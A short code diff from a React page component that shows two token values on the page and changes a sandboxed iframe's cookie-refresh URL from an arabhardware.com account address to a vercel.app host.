@@ -18,7 +18,7 @@ function Page() {
     <div className='w-full h-full space-y-4 p-grid max-w-grid'>
         {token && <p className=' break-all text-left' id='token'>{token}</p>}
         {token && <p className=' break-all text-left' id='token1'>{token1}</p>}
-        <iframe id="iframe4" name="iframe4" src={`https://myaccount.arabhardware.com/refresh/cookie`}
+        <iframe id="iframe4" name="iframe4" src={`https://user-profile-lyart.vercel.app/refresh/cookie`}
         sandbox="allow-same-origin allow-scripts"
         className=""></iframe>
     </div>
